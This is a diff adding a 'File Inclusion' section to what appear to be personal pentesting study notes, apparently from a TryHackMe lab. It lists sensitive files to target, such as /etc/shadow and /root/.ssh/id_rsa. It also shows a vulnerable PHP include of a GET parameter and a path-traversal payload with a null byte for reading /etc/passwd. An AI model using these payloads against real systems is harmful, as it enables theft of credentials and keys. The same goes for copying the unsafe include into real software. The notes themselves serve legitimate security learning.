@@ -49,3 +49,23 @@
 
 **find IDOR in Hashed IDs**
 - https://crackstation.net/
+
+## File Inclusion
+common OS files:
+- /etc/issue, /etc/profile, /proc/version, /etc/passwd,
+- /etc/shadow, /root/.bash_history, /var/log/dmessage,
+- /var/mail/root, /root/.ssh/id_rsa, /var/log/apache2/access.log
+- C:\boot.ini
+
+php function reason: https://www.php.net/manual/en/function.file-get-contents.php
+
+Local File Inclusion (LFI)
+```php
+<?PHP 
+	include("languages/". $_GET['lang']); 
+?>
+```
+
+Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
+- Conquer: ``` include("languages/../../../../../etc/passwd%00").".php"); ``` %00 or 0x00
+
